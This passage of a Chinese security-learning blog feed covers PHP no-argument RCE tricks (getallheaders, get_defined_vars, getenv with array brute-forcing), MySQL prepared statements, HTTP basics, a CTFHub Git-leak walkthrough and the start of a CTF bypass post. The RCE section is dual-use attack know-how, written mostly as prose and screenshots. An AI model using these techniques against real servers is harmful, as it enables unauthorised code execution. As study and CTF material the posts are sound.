variable">$_COOKIE</span><span class="token variable">$_SESSION</span><span class="token variable">$_REQUEST</span><span class="token variable">$_ENV</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code></p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518162644882.png" alt="image-20210518162644882"></p><p>但如何从数组中取出指定值，这里可以使用方法：<img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518162756460.png" alt="image-20210518162756460"></p><p>结合array_rand()、array_flip()及getenv()，我们可以用爆破的方式获取数组中任意位置需要的值，可获取指定位置的恶意参数。</p><h3 id="法三：getallheaders"><a href="#法三：getallheaders" class="headerlink" title="法三：getallheaders()"></a>法三：getallheaders()</h3><p><strong>限制</strong>：getallheaders()为apache函数，目标中间件必须为apache。</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518192151719.png" alt="image-20210518192151719"></p><p>返回值</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token punctuation">[</span><span class="token string">"Cookie"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span> <span class="token string">"PHPSESSID=58o6f1g08ot3drhnbs0m22i1hv"</span>     <span class="token punctuation">[</span><span class="token string">"Accept-Language"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span> <span class="token string">"en-US,en;q=0.9"</span>     <span class="token punctuation">[</span><span class="token string">"Accept-Encoding"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span> <span class="token string">"gzip, deflate, br"</span>     <span class="token punctuation">[</span><span class="token string">"Sec-Fetch-Dest"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token string">"document"</span>     <span class="token punctuation">[</span><span class="token string">"Sec-Fetch-Mode"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token string">"navigate"</span>     <span class="token punctuation">[</span><span class="token string">"Sec-Fetch-Site"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token string">"cross-site"</span>     <span class="token punctuation">[</span><span class="token string">"Accept"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">135</span><span class="token punctuation">)</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>     <span class="token punctuation">[</span><span class="token string">"User-Agent"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"</span>     <span class="token punctuation">[</span><span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1"</span>     <span class="token punctuation">[</span><span class="token string">"Sec-Ch-Ua-Mobile"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"?0"</span>     <span class="token punctuation">[</span><span class="token string">"Sec-Ch-Ua"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token string">""</span> Not A<span class="token punctuation">;</span>Brand<span class="token string">";v="</span><span class="token number">99</span><span class="token string">", "</span>Chromium<span class="token string">";v="</span><span class="token number">90</span><span class="token string">", "</span>Google Chrome<span class="token string">";v="</span><span class="token number">90</span><span class="token string">""</span>     <span class="token punctuation">[</span><span class="token string">"Connection"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"close"</span>     <span class="token punctuation">[</span><span class="token string">"Host"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string">"127.0.0.1"</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过修改request包，进行简单爆破就能获取指定位置的恶意参数</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210518200344715.png" alt="image-20210518200344715"></p><h3 id="法四：get-defined-vars"><a href="#法四：get-defined-vars" class="headerlink" title="法四：get_defined_vars()"></a>法四：get_defined_vars()</h3><p>利用get_defined_vars()使用范围更广一些。</p><p>查看回显</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203122147.png" alt="image-20210518203122147"></p><p>发现其可以回显全局变量</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_GET</span><span class="token variable">$_POST</span><span class="token variable">$_FILES</span><span class="token variable">$_COOKIE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里的选择也就具有多样性，可以利用<code>$_GET</code>进行RCE，如下<img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203341256.png" alt="image-20210518203341256"></p><p>将其参数取出</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203719246.png" alt="image-20210518203719246"></p><p>可以成功RCE</p><h1 id="异或-取反-自增-按位或-按位与"><a href="#异或-取反-自增-按位或-按位与" class="headerlink" title="异或 取反 自增 按位或 按位与"></a>异或 取反 自增 按位或 按位与</h1><p>先记录这么个思路，待实践。</p>]]></content>
      
      
      <categories>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Prepared Statements</title>
      <link href="/2021/09/10/prepared-statements/"/>
      <url>/2021/09/10/prepared-statements/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL的SQL预处理-Prepared"><a href="#MySQL的SQL预处理-Prepared" class="headerlink" title="MySQL的SQL预处理(Prepared)"></a>MySQL的SQL预处理(Prepared)</h1><p>学习自<a href="https://www.cnblogs.com/geaozhang/p/9891338.html#a" target="_blank" rel="noopener">MySQL的SQL预处理(Prepared)</a></p><blockquote><p>Prepared SQL Statement：SQL的执行、预编译处理语法、注意点</p></blockquote><p>[toc]</p><h2 id="一、SQL-语句的执行处理"><a href="#一、SQL-语句的执行处理" class="headerlink" title="一、SQL 语句的执行处理"></a>一、SQL 语句的执行处理</h2><h3 id="1、即时-SQL"><a href="#1、即时-SQL" class="headerlink" title="1、即时 SQL"></a>1、即时 SQL</h3><p>一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：</p><ol><li><p>词法和语义解析；</p></li><li><p>优化 SQL 语句，制定执行计划；</p></li><li><p>执行并返回结果；</p></li></ol><p>​        如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。</p><h3 id="2、预处理-SQL"><a href="#2、预处理-SQL" class="headerlink" title="2、预处理 SQL"></a>2、预处理 SQL</h3><p>​        但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。<br>​        所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。</p><p>​        预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p><p><strong>注意：</strong></p><p>​        虽然可能是通过预处理 SQL 的方式一定程度的提高了效率，但是对于优化而言，最优的执行计划不是光靠 SQL 语句的模板化来实现的，往往还是需要通过具体值来预估出成本代价。</p><h2 id="二、Prepared-SQL-Statement-Syntax"><a href="#二、Prepared-SQL-Statement-Syntax" class="headerlink" title="二、Prepared SQL Statement Syntax"></a>二、Prepared SQL Statement Syntax</h2><p>​        MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。<br>　　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。<br>语法：</p><pre><code># 定义预处理语句PREPARE stmt_name FROM preparable_stmt;# 执行预处理语句EXECUTE stmt_name [USING @var_name [, @var_name] ...];# 删除(释放)定义{DEALLOCATE | DROP} PREPARE stmt_name;</code></pre><h3 id="1、利用字符串定义预处理-SQL-直角三角形计算"><a href="#1、利用字符串定义预处理-SQL-直角三角形计算" class="headerlink" title="1、利用字符串定义预处理 SQL (直角三角形计算)"></a>1、利用字符串定义预处理 SQL (直角三角形计算)</h3><pre><code>mysql&gt; PREPARE stmt1 FROM 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse';Query OK, 0 rows affected (0.00 sec)Statement preparedmysql&gt; SET @a = 3;Query OK, 0 rows affected (0.00 sec)mysql&gt; SET @b = 4;                                                   Query OK, 0 rows affected (0.00 sec)mysql&gt; EXECUTE stmt1 USING @a, @b;+------------+| hypotenuse |+------------+|          5 |+------------+1 row in set (0.00 sec)mysql&gt; DEALLOCATE PREPARE stmt1;                                     Query OK, 0 rows affected (0.00 sec)</code></pre><h3 id="2、利用变量定义预处理-SQL-直角三角形计算"><a href="#2、利用变量定义预处理-SQL-直角三角形计算" class="headerlink" title="2、利用变量定义预处理 SQL (直角三角形计算)"></a>2、利用变量定义预处理 SQL (直角三角形计算)</h3><pre><code>mysql&gt; SET @s = 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse';Query OK, 0 rows affected (0.00 sec)mysql&gt; PREPARE stmt2 FROM @s;Query OK, 0 rows affected (0.00 sec)Statement preparedmysql&gt; SET @c = 6;Query OK, 0 rows affected (0.00 sec)mysql&gt; SET @d = 8;Query OK, 0 rows affected (0.00 sec)mysql&gt; EXECUTE stmt2 USING @c, @d;+------------+| hypotenuse |+------------+|         10 |+------------+1 row in set (0.00 sec)mysql&gt; DEALLOCATE PREPARE stmt2;Query OK, 0 rows affected (0.00 sec)</code></pre><h3 id="3、解决无法传参问题"><a href="#3、解决无法传参问题" class="headerlink" title="3、解决无法传参问题"></a>3、解决无法传参问题</h3><p>　　我们知道，对于 LIMIT 子句中的值，必须是常量，不得使用变量，也就是说不能使用：SELECT * FROM TABLE LIMIT @skip, @numrows; 如此，就可以是用 PREPARE 语句解决此问题。</p><pre><code>mysql&gt; SET @skip = 100; SET @numrows = 3;Query OK, 0 rows affected (0.00 sec)Query OK, 0 rows affected (0.00 sec)mysql&gt; SELECT * FROM t1 LIMIT @skip, @numrows;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '@skip, @numrows' at line 1mysql&gt; PREPARE stmt3 FROM "SELECT * FROM t1 LIMIT ?, ?";Query OK, 0 rows affected (0.00 sec)Statement preparedmysql&gt; EXECUTE stmt3 USING @skip, @numrows;+-----+--------+| a   | filler |+-----+--------+| 100 | filler || 101 | filler || 102 | filler |+-----+--------+3 rows in set (0.00 sec)mysql&gt; DEALLOCATE PREPARE stmt3;Query OK, 0 rows affected (0.00 sec)</code></pre><p> 　   如此一来，结合2中介绍的利用变量定义预处理 SQL 也就基本解决了传参时语法报错问题了，类似的：用变量传参做表名时，MySQL 会把变量名当做表名，这样既不是本意，也会是语法错误，在 SQL Server 的解决办法是利用字符串拼接穿插变量进行传参，再将整条 SQL 语句作为变量，最后是用 sp_executesql 调用该拼接 SQL 执行，而 Prepared SQL Statement 可谓异曲同工之妙。</p><pre><code>mysql&gt; SET @table = 't2';Query OK, 0 rows affected (0.00 sec)mysql&gt; SET @s = CONCAT('SELECT * FROM ', @table);Query OK, 0 rows affected (0.00 sec)mysql&gt; PREPARE stmt4 FROM @s;Query OK, 0 rows affected (0.00 sec)Statement preparedmysql&gt; EXECUTE stmt4;+------+-------+-------+| id   | score | grade |+------+-------+-------+|    1 |    99 | A     ||    2 |    81 | B     ||    3 |    55 | D     ||    4 |    69 | C     |+------+-------+-------+4 rows in set (0.00 sec)mysql&gt; DROP PREPARE stmt4;Query OK, 0 rows affected (0.00 sec)</code></pre><h2 id="三、预处理-SQL-使用注意点"><a href="#三、预处理-SQL-使用注意点" class="headerlink" title="三、预处理 SQL 使用注意点"></a>三、预处理 SQL 使用注意点</h2><p>1、stmt_name 作为 preparable_stmt 的接收者，唯一标识，不区分大小写。<br>2、preparable_stmt 语句中的 ? 是个占位符，所代表的是一个字符串，不需要将 ? 用引号包含起来。<br>3、定义一个已存在的 stmt_name ，原有的将被立即释放，类似于变量的重新赋值。<br>4、PREPARE stmt_name 的作用域是session级</p><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/1113510-20181101192302151-157684852.png" alt="img"><br>　　可以通过 max_prepared_stmt_count 变量来控制全局最大的存储的预处理语句。</p><pre><code>mysql&gt; show variables like 'max_prepared%';+-------------------------+-------+| Variable_name           | Value |+-------------------------+-------+| max_prepared_stmt_count | 16382 |+-------------------------+-------+1 row in set (0.00 sec)</code></pre><p> 　   预处理编译 SQL 是占用资源的，所以在使用后注意及时使用 DEALLOCATE PREPARE 释放资源，这是一个好习惯。</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OS命令注入Bypass</title>
      <link href="/2021/09/10/os-ming-ling-zhu-ru-bypass/"/>
      <url>/2021/09/10/os-ming-ling-zhu-ru-bypass/</url>
      
        <content type="html"><![CDATA[<h1 id="Bypass一些命令注入限制的姿势"><a href="#Bypass一些命令注入限制的姿势" class="headerlink" title="Bypass一些命令注入限制的姿势"></a>Bypass一些命令注入限制的姿势</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>待写。。。</p>]]></content>
      
      
      <categories>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议</title>
      <link href="/2021/09/10/http-xie-yi/"/>
      <url>/2021/09/10/http-xie-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><h2 id="重要性"><a href="#重要性" class="headerlink" title="重要性"></a><strong>重要性</strong></h2><ul><li><p><em>无论是以后用webservice，还是用rest做大型架构，都离不开对HTTP协议的认识。</em></p></li><li><p><em>甚至可以简化地说：</em><br><em>ebService = HTTP协议 + XML</em><br><em>Rest = HTTP协议 + json</em><br><em>各种API也一般是用HTTP + XML/json来实现的</em></p></li><li><p><em>在对HTTP协议有了了解之后，学习Ajax是非常容易理解的</em></p></li></ul><h2 id="什么是协议"><a href="#什么是协议" class="headerlink" title="什么是协议"></a><strong>什么是协议</strong></h2><ul><li><p><em>计算机中的协议和现实中的协议是一样的，一式双份/多份。双方/多方都遵从共同的一个规范，这个规范就可以称为协议。</em></p></li><li><p><u>ftp、http、stmp、pop、tcp/ip协议</u></p></li></ul><h2 id="什么是http协议"><a href="#什么是http协议" class="headerlink" title="什么是http协议"></a><strong>什么是http协议</strong></h2><ul><li><em>http协议即按照一定规则，向服务器请求数据或发送数据，而服务器按一定规则返回数据。</em></li></ul><h2 id="HTTP工作流程"><a href="#HTTP工作流程" class="headerlink" title="HTTP工作流程"></a><strong>HTTP工作流程</strong></h2><ul><li><img src="https://gitee.com/h1ler/tuci/raw/master/null/wps1.png" alt="wps1"></li></ul><h2 id="HTTP请求信息和响应信息的格式"><a href="#HTTP请求信息和响应信息的格式" class="headerlink" title="HTTP请求信息和响应信息的格式"></a><strong>HTTP请求信息和响应信息的格式</strong></h2><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20200728160038988.png" alt=""></p><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20200728160443257.png" alt="image-20200728160443257"></p><ul><li>请求：</li></ul><ul><li><p>请求行</p><ul><li><p>请求方法</p><ul><li><p>GET</p></li><li><p>POST</p><p>与GET基本一致，只是不返回内容。</p><p>例如我们只是确认一个内容（例如照片）是否正常存在，不需要返回照片内容，则用HEAD</p></li><li><p>HEAD</p></li><li><p>PUT</p></li><li><p>DELETE</p></li><li><p>TRACE</p><p>当使用代理上网时，用代理访问new.163.com，用TRACE可以测试代理是否修改你的HTTP请求，163.com的服务器会将最后收到的请求返回</p></li><li><p>OPTIONS</p><p>返回服务器可用的请求方法</p></li></ul><blockquote><p> 注意：这些请求方法虽然HTTP协议里规定的，但WebService未必允许或支持这些方法</p></blockquote></li><li><p>请求路径</p></li><li><p>所用的协议</p><p>目前一般是HTTP/1.1，而0.9和10版本已经基本不用。</p></li></ul></li><li><p>请求头信息</p><ul><li><p>格式  Key:Value</p></li><li><p>Host</p></li><li><p>User-agent:    用户代理  </p><p>向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识（爬虫可利用此伪装成用户）</p></li><li><p>Referer    告诉服务器该网页是从哪个页面链接过来的</p></li><li><p>X-Forwarded-For    用来识别通过<a href="https://baike.baidu.com/item/HTTP" target="_blank" rel="noopener">HTTP</a><a href="https://baike.baidu.com/item/代理" target="_blank" rel="noopener">代理</a>或<a href="https://baike.baidu.com/item/负载均衡" target="_blank" rel="noopener">负载均衡</a>方式连接到<a href="https://baike.baidu.com/item/Web服务器" target="_blank" rel="noopener">Web服务器</a>的客户端最原始的<a href="https://baike.baidu.com/item/IP地址" target="_blank" rel="noopener">IP地址</a>的HTTP请求头字段(可利用伪造任意的IP地址)</p></li><li><p>Content-Type</p></li><li><p>Content-Length    接下来主体的长度</p></li></ul></li><li><p>请求主体信息（可选）</p></li></ul><blockquote><p>问：浏览器能发送HTTP协议，HTTP协议一定要浏览器来发送吗？</p><p>答：不是，HTTP既然是一种协议，那么只要满足这种协议，什么工具都可以发。</p></blockquote><ul><li><p>响应：</p><ul><li><p>响应行</p><ul><li>协议</li><li>状态码</li><li>状态文字</li></ul></li><li><p>响应头信息</p><ul><li><p>格式  Key:Value</p></li><li><p>Content-Type</p></li><li><p>Content-Length    接下来主体的长度</p></li></ul></li><li><p>响应主体信息(也可能没有)</p></li></ul></li></ul><blockquote><p>作业：用telnet来完成HTTP协议的POST请求</p><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20200728164614323.png" alt="image-20200728164614323"></p></blockquote><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/hLj2cPlvxSo79EH.png" alt="image-20200729004054696"></p><h2 id="状态码，状态文字"><a href="#状态码，状态文字" class="headerlink" title="状态码，状态文字"></a><strong>状态码，状态文字</strong></h2><p>状态码是用来反应服务器响应情况的。</p><p>最常见的如 200 OK，404 NOT FOUND</p><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20200729011518611.png" alt="image-20200729011518611"></p><ul><li><p>常见状态码</p><p>200    -    服务器成功返回页面</p><p>301/302    -    永久/临时重定向</p><p>304 NOT Modified    -    未修改</p><p><strong>307    -    重定向中保持原有的请求数据</strong></p><p>失败的状态码：</p><p>404    -    请求的网页不存在</p><p>503    -    服务器暂时不可用</p><p>500    -    服务器内部错误</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git泄露</title>
      <link href="/2021/09/10/git-xie-lu/"/>
      <url>/2021/09/10/git-xie-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFHub-Git泄露"><a href="#CTFHub-Git泄露" class="headerlink" title="CTFHub-Git泄露"></a>CTFHub-Git泄露</h1><p>一般思路：用dirsearch扫描发现git泄露</p><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023245829.png" alt="image-20201023023245829"></p><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023226766.png" alt="image-20201023023226766"></p><h2 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h2><ul><li><p>知识点：详见<a href="https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E6%9F%A5%E7%9C%8B%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2" target="_blank" rel="noopener">Git 基础 - 查看提交历史</a>、<a href="https://git-scm.com/docs/git-diff" target="_blank" rel="noopener">git diff</a></p></li><li><p>使用GitHack工具处理Git泄露情况<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023023626635.png" alt="image-20201023023626635"></p></li><li><p>切换到爬下来的目录中用<code>git log</code>查看日志<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024006671.png" alt="image-20201023024006671"></p></li><li><p>得到Flag</p><ul><li><p>方法一：发现提交说明中有add flag，利用<code>git diff</code>来查看commits之间的不同<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024655911.png" alt="image-20201023024655911"></p></li><li><p>方法二：用<code>git reset --hard</code>退回提交说明为add flag的版本<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023024951095.png" alt="image-20201023024951095"></p><p>即可将add flag版本克隆在本地文件夹中<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025225404.png" alt="image-20201023025225404"></p></li></ul></li></ul><h2 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h2><ul><li>知识点：<a href="https://www.cnblogs.com/tocy/p/git-stash-reference.html" target="_blank" rel="noopener">git-stash用法小结</a></li><li>操作同上，进入文件夹后使用<code>git log</code><img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025747482.png" alt="image-20201023025747482"></li><li><code>git diff</code>并没有flag信息<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023025905370.png" alt="image-20201023025905370"></li><li><code>git stash list</code>操作，查看现有stash<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030022983.png" alt="image-20201023030022983"></li><li><code>git stash apply</code>重新应用缓存的stash<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030151666.png" alt="image-20201023030151666"></li><li><code>git diff</code>重新比对得到flag<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023030323906.png" alt="image-20201023030323906"></li></ul><h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git学习</title>
      <link href="/2021/09/10/git-xue-xi/"/>
      <url>/2021/09/10/git-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><ul><li>Leaning from <a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">Git book</a></li></ul><h2 id="2-Git-基础"><a href="#2-Git-基础" class="headerlink" title="2. Git 基础"></a>2. Git 基础</h2><h3 id="2-3-Git-基础-查看提交历史"><a href="#2-3-Git-基础-查看提交历史" class="headerlink" title="2.3 Git 基础 - 查看提交历史"></a>2.3 Git 基础 - 查看提交历史</h3><ul><li><p><code>git log</code> 命令</p><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013143508.png" alt="image-20201023013143508"></p><ul><li><p>该命令列出每个提交的 SHA-1 校验值、作者的名字和电子邮件地址、提交时间以及提交说明。</p></li><li><p>不传入任何参数的默认情况下，<code>git log</code> 会按时间先后顺序列出所有的提交，最近的更新排在最上面。</p></li><li><p>选项 <code>-p</code> 或 <code>--patch</code> 。它会显示每次提交所引入的差异（按 <strong>补丁</strong> 的格式输出），你也可以限制显示的日志条目数量，例如使用 <code>-2</code> 选项来只显示最近的两次提交。<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013249918.png" alt="image-20201023013249918"></p></li><li><p>选项 <code>--stat</code> 。当进行代码审查，或者快速浏览某个搭档的提交所带来的变化的时候，这个参数就非常有用了。你也可以为 <code>git log</code> 附带一系列的总结性选项。 比如你想看到每次提交的简略统计信息：<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013424138.png" alt="image-20201023013424138">正如你所看到的，<code>--stat</code> 选项在每次提交的下面列出所有被修改过的文件、有多少文件被修改了以及被修改过的文件的哪些行被移除或是添加了。 在每次提交的最后还有一个总结。</p></li><li><p>选项 <code>--pretty</code>。这个选项可以使用<strong>不同于默认格式</strong>的方式展示提交历史。 这个选项有一些内建的子选项供你使用。</p><ul><li><p>比如 <code>oneline</code> 会将每个提交放在一行显示，在浏览大量的提交时非常有用。 另外还有 <code>short</code>，<code>full</code> 和 <code>fuller</code> 子选项，与<code>oneline</code>展示信息的格式基本一致，详尽程度不一。<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023013831955.png" alt="image-20201023013831955"></p></li><li><p>子选项 <code>format</code> ，可以定制记录的显示格式<img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201023014446505.png" alt="image-20201023014446505"><code>format</code> 接受的常用格式占位符的写法及其代表的意义可参考官方文档<a href="https://git-scm.com/book/zh/v2/ch00/pretty_format" target="_blank" rel="noopener">常用的选项</a></p></li></ul></li><li><p><code>--since</code> 和 <code>--until</code> 这种按照时间作限制的选项很有用。 例如，下面的命令会列出最近两周的所有提交：</p><pre class="line-numbers language-shell"><code class="language-shell">$ git log --since=2.weeks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该命令可用的格式十分丰富——可以是类似 <code>"2008-01-15"</code> 的具体的某一天，也可以是类似 <code>"2 years 1 day 3 minutes ago"</code> 的相对日期。</p></li><li><p><code>--author</code> 选项显示指定作者的提交.</p></li><li><p><code>--grep</code> 选项搜索提交说明中的关键字。</p></li><li><p>另一个非常有用的过滤器是 <code>-S</code>（俗称“pickaxe”选项，取“用鹤嘴锄在土里捡石头”之意）， 它接受一个字符串参数，并且只会显示那些添加或删除了该字符串的提交。 假设你想找出添加或删除了对某一个特定函数的引用的提交，可以调用：</p><pre class="line-numbers language-shell"><code class="language-shell">$ git log -S function_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ul><h2 id="git-stash用法小结"><a href="#git-stash用法小结" class="headerlink" title="git-stash用法小结"></a><a href="https://www.cnblogs.com/tocy/p/git-stash-reference.html" target="_blank" rel="noopener">git-stash用法小结</a></h2>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF——Web安全中的一些绕过</title>
      <link href="/2021/09/10/ctf-web-an-quan-zhong-de-yi-xie-rao-guo/"/>
      <url>/2021/09/10/ctf-web-an-quan-zhong-de-yi-xie-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF——Web安全中的一些绕过"><a href="#CTF——Web安全中的一些绕过" class="headerlink" title="CTF——Web安全中的一些绕过"></a>CTF——Web安全中的一些绕过</h1><ul><li>Learning from <a href="https://www.cnblogs.com/leixiao-/" target="_blank" rel="noopener">淚笑</a>、<a href="https://www.cnblogs.com/ECJTUACM-873284962/" target="_blank" rel="noopener">Angel_Kitty</a>、<a href="https://www.leavesongs.com/" target="_blank" rel="noopener">离别歌</a></li></ul><h2 id="利用数的十六进制"><a href="#利用数的十六进制" class="headerlink" title="利用数的十六进制"></a>利用数的十六进制</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$one</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$nine</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$digit</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token 